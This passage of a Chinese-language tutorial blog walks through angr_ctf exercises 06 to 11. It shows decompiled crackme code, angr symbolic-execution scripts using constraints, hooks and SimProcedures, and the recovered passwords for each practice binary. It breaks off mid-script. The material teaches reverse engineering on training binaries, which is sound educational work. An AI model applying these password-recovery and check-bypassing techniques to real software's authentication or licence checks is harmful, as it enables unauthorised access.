sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    start_addr = <span class="number">0x08048699</span></span><br><span class="line">    init_state = project.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ESP:&quot;</span>, init_state.regs.esp)</span><br><span class="line"></span><br><span class="line">    buffer0 = init_state.regs.esp - <span class="number">0x100</span></span><br><span class="line">    buffer1 = init_state.regs.esp - <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">    buffer0_addr = <span class="number">0x0ABCC8A4</span></span><br><span class="line">    buffer1_addr = <span class="number">0x0ABCC8AC</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># endness 表示大小端, angr默认为大端序</span></span><br><span class="line">    init_state.memory.store(buffer0_addr, buffer0, endness = project.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(buffer1_addr, buffer1,                            endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    password = [init_state.solver.BVS(<span class="string">&quot;password%d&quot;</span>, <span class="number">8</span> * <span class="number">8</span> ) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buffer0, password[<span class="number">0</span>])</span><br><span class="line">    init_state.memory.store(buffer1, password[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(password[i], cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Solution not found.&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 06_angr_symbolic_dynamic_memory</span><br><span class="line">ESP: &lt;BV32 0x7ffefffc&gt;</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 found, 34 avoid&gt;</span><br><span class="line">b<span class="string">&#x27;UBDKLMBV&#x27;</span></span><br><span class="line">b<span class="string">&#x27;UNOERNYS&#x27;</span></span><br></pre></td></tr></table></figure><p>检验一下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./06_angr_symbolic_dynamic_memory</span><br><span class="line">Enter the password: UBDKLMBV UNOERNYS</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><p>正确</p><h5 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h5><blockquote><p>这个主要学习如何符号化一个文件里面的内容</p></blockquote><p>主函数如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl __noreturn main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed <span class="built_in">int</span> i; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  memset(buffer, <span class="number">0</span>, 0x40u);</span><br><span class="line">  printf(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me((<span class="built_in">int</span>)buffer, 0x40u);</span><br><span class="line">  memset(buffer, <span class="number">0</span>, 0x40u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, 1u, 0x40u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134520992</span>) = complex_function(*(char *)(i + <span class="number">134520992</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( strncmp(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, 9u) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ignore_me</code> 主要是把第一个读取的内容存入<code>OJKSQYDP.txt</code>, 不用我们自己创建文件 , 然后从文件<code>OJKSQYDP.txt</code>读取数据存入<code>buff</code></p><p>这里我们对文件的内容进行符号化, 地址从<code>0x080488D6</code>开始, 主要是初始化<code>buff</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080488CE                 call    ignore_me</span><br><span class="line">.text:080488D3                 add     esp, 10h    ; 这个是ignore_me的栈回收</span><br><span class="line">.text:080488D6                 sub     esp, 4</span><br><span class="line">.text:080488D9                 push    40h             ; n</span><br><span class="line">.text:080488DB                 push    0               ; c</span><br><span class="line">.text:080488DD                 push    offset buffer   ; s</span><br><span class="line">.text:080488E2                 call    _memset</span><br></pre></td></tr></table></figure><h6 id="脚本-7"><a href="#脚本-7" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    start_addr = <span class="number">0x080488D6</span></span><br><span class="line">    init_state = project.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;OJKSQYDP.txt&quot;</span></span><br><span class="line">    file_size = <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">    password = init_state.solver.BVS(<span class="string">&quot;password&quot;</span>, file_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SimFile是构造文件信息, 包括文件名, 文件内容和文件大小</span></span><br><span class="line">    simgr_file = angr.storage.SimFile(</span><br><span class="line">        filename, content=password, size=file_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># angr.fs.insert是将文件插入到文件系统中, 需要文件名与符号化的文件</span></span><br><span class="line">    init_state.fs.insert(filename, simgr_file)</span><br><span class="line"></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Solution not found.&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 07_angr_symbolic_file</span><br><span class="line">.....</span><br><span class="line">&lt;SimulationManager with 1 found, 17 avoid&gt;</span><br><span class="line">b<span class="string">&#x27;AZOMMMZM&#x27;</span></span><br></pre></td></tr></table></figure><p>验证一下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./07_angr_symbolic_file</span><br><span class="line">Enter the password: AZOMMMZM</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h5><p>前面我们曾经把<code>auto_load_libs=False</code>关闭, 主要是因为符号执行有个问题:<code>路径爆炸问题</code>, 例如strcpy, 一个一个字符的比较就会产生非常多的路径, 导致路径爆炸。</p><blockquote><p>该题主要学习通过添加约束条件来解决路径爆炸问题</p></blockquote><p>主函数如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, &amp;buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134520912</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">134520912</span>), <span class="number">15</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_AUPDNNPROEZRJWKB((<span class="keyword">int</span>)&amp;buffer, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中, <code>check_equals_AUPDNNPROEZRJWKB()</code>函数就是一个字符一个字符的比较, 就会产生<code>路径爆炸问题</code>, 这里我们的解决方法是当执行到这个函数里面时, 我们用自己的方法来实现, 实现的方法是添加约束<code>add_constraints</code></p><p>这里我们首先还是跳过<code>scanf()</code>函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:08048613                 push    offset buffer</span><br><span class="line">.text:08048618                 push    offset a16s     ; &quot;%16s&quot;</span><br><span class="line">.text:0804861D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048622                 add     esp, 10h</span><br><span class="line">.text:08048625                 mov     [ebp+var_C], 0</span><br><span class="line">.text:0804862C                 jmp     short loc_8048663</span><br></pre></td></tr></table></figure><p>开始地址从<code>mov     [ebp+var_C], 0</code>, 即<code>0x08048625</code>开始</p><h6 id="脚本-8"><a href="#脚本-8" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    start_addr = <span class="number">0x08048625</span></span><br><span class="line">    init_state = project.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">    buff_addr = <span class="number">0x0804A050</span></span><br><span class="line">    password = init_state.solver.BVS(<span class="string">&quot;password&quot;</span>, <span class="number">16</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buff_addr, password)</span><br><span class="line"></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    check_addr = <span class="number">0x08048565</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当找到这个函数时</span></span><br><span class="line">    simgr.explore(find = check_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        check_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        desired_string = <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span></span><br><span class="line">        check_param1 =  buff_addr</span><br><span class="line">        check_param2 = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        check_bvs = check_state.memory.load(check_param1, check_param2)</span><br><span class="line"></span><br><span class="line">        check_constraint = desired_string == check_bvs</span><br><span class="line"></span><br><span class="line">        check_state.add_constraints(check_constraint)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(check_state.solver.<span class="built_in">eval</span>(password, cast_to = <span class="built_in">bytes</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 08_angr_constraints</span><br><span class="line">.....</span><br><span class="line">b<span class="string">&#x27;LGCRCDGJHYUNGUJB&#x27;</span></span><br></pre></td></tr></table></figure><p>验证一下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./08_angr_constraints</span><br><span class="line">Enter the password: LGCRCDGJHYUNGUJB</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h5><blockquote><p>这里学习使用angr的hook技术解决路径爆炸问题, 由于angr支持多参数, 因此不需要之前复杂的写法, 之前主要为了学习</p></blockquote><p>主函数如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">&quot;XYMKBKUHNIQYNQXE&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">134520916</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">134520916</span>), <span class="number">18</span> - i);</span><br><span class="line">  equals = check_equals_XYMKBKUHNIQYNQXE((<span class="keyword">int</span>)buffer, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    *(_BYTE *)(j + <span class="number">134520900</span>) = complex_function(*(<span class="keyword">char</span> *)(j + <span class="number">134520900</span>), j + <span class="number">9</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  v3 = equals &amp;&amp; !<span class="built_in">strncmp</span>(buffer, password, <span class="number">0x10</span>u);</span><br><span class="line">  equals = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要hook掉<code>check_equals_XYMKBKUHNIQYNQXE()</code>函数, 方法如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486AC                 push    10h</span><br><span class="line">.text:080486AE                 push    offset buffer</span><br><span class="line">.text:080486B3                 call    check_equals_XYMKBKUHNIQYNQXE</span><br><span class="line">.text:080486B8                 add     esp, 10h</span><br></pre></td></tr></table></figure><ul><li><p>首先找到需要hook的地址<code>0x080486B3</code></p></li><li><p>接着需要hook的长度, 由于我们hook掉<code>call    check_equals_XYMKBKUHNIQYNQXE</code>, 指令长度为<code>5</code></p></li><li><p>然后在脚本中进行hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check_equals_called_address = <span class="number">0x80486B3</span></span><br><span class="line">instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"><span class="meta">@project.hook(<span class="params">check_equals_called_address, length=instruction_to_skip_length</span>)</span></span><br></pre></td></tr></table></figure></li><li><p>然后对函数进行模拟, 紧跟在<code>@project.hook</code>语句之后</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span>(<span class="params">state</span>):</span></span><br><span class="line">        user_input_buff_address = <span class="number">0x804a054</span></span><br><span class="line">        user_input_buff_length = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 加载进内存</span></span><br><span class="line">        user_input_string = state.memory.load(</span><br><span class="line">            user_input_buff_address,              user_input_buff_length</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对</span></span><br><span class="line">        check_against_string = <span class="string">&quot;XKSPZSJKJYQCQXZV&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接着进行判断, eax是函数的返回值</span></span><br><span class="line">        state.regs.eax = claripy.If (</span><br><span class="line">            user_input_string == check_against_string,              claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), <span class="comment"># 成功则返回1, eax是32位寄存器</span></span><br><span class="line">            claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)  <span class="comment"># 不成功则返回0</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure></li></ul><h6 id="脚本-9"><a href="#脚本-9" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80486B3</span></span><br><span class="line"></span><br><span class="line">    instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(<span class="params">check_equals_called_address, length=instruction_to_skip_length</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span>(<span class="params">state</span>):</span></span><br><span class="line">        user_input_buff_address = <span class="number">0x804a054</span></span><br><span class="line">        user_input_buff_length = <span class="number">16</span></span><br><span class="line">        user_input_string = state.memory.load(</span><br><span class="line">            user_input_buff_address,            user_input_buff_length</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        check_against_string = <span class="string">&quot;XKSPZSJKJYQCQXZV&quot;</span></span><br><span class="line"></span><br><span class="line">        state.regs.eax = claripy.If (</span><br><span class="line">            user_input_string == check_against_string,            claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),            claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find = is_successful, avoid = should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        <span class="built_in">print</span>(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Could not find the solution&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 09_angr_hooks</span><br><span class="line">......</span><br><span class="line"><span class="string">&#x27;ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK&#x27;</span></span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./09_angr_hooks</span><br><span class="line">Enter the password: ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h5><blockquote><p>这里学习如何用函数名对函数进行hook</p></blockquote><p>用IDA打开以后, 发现在很多的地方进行了<code>check_equals_ORSDDWXHZURJRBDH()</code></p><p>虽然用IDA的优化我们可以很快定位最终执行的是哪里的check函数, 但是这并不是我们学习的重点, 这里我们主要学习如何用函数名对函数进行hook</p><p>Hook方法如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span> <span class="comment"># 继承自angr.SimProcedure, 模拟函数执行</span></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, user_input, user_input_length</span>):</span></span><br><span class="line">          angr_bvs = self.state.memory.load (</span><br><span class="line">              user_input,                user_input_length</span><br><span class="line">          )</span><br><span class="line"></span><br><span class="line">          check_string = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> claripy.If (</span><br><span class="line">              check_string == angr_bvs,                claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),                claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">          )</span><br><span class="line">  <span class="comment"># 函数名</span></span><br><span class="line">  check_symbol = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">  <span class="comment"># hook函数</span></span><br><span class="line">  project.hook_symbol(check_symbol, mySimPro())</span><br></pre></td></tr></table></figure><h6 id="脚本-10"><a href="#脚本-10" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, user_input, user_input_length</span>):</span></span><br><span class="line">            angr_bvs = self.state.memory.load (</span><br><span class="line">                user_input,                user_input_length</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            check_string = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> claripy.If (</span><br><span class="line">                check_string == angr_bvs,                claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),                claripy.BVV(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    check_symbol = <span class="string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">    project.hook_symbol(check_symbol, mySimPro())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_output = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find = is_successful, avoid = should_abort)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        <span class="built_in">print</span>(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Could not find the solution&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 10_angr_simprocedures</span><br><span class="line">......</span><br><span class="line"><span class="string">&#x27;MSWKNJNAVTTOZMRY&#x27;</span></span><br></pre></td></tr></table></figure><p>验证:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./10_angr_simprocedures</span><br><span class="line">Enter the password: MSWKNJNAVTTOZMRY</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h5><blockquote><p>这里主要学习hook<code>scanf</code>函数</p></blockquote><p>Hook思路和10差不多</p><ul><li>首先知道函数名</li><li>编写一个类来替代它</li><li>然后对函数进行hook</li></ul><h6 id="脚本-11"><a href="#脚本-11" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span 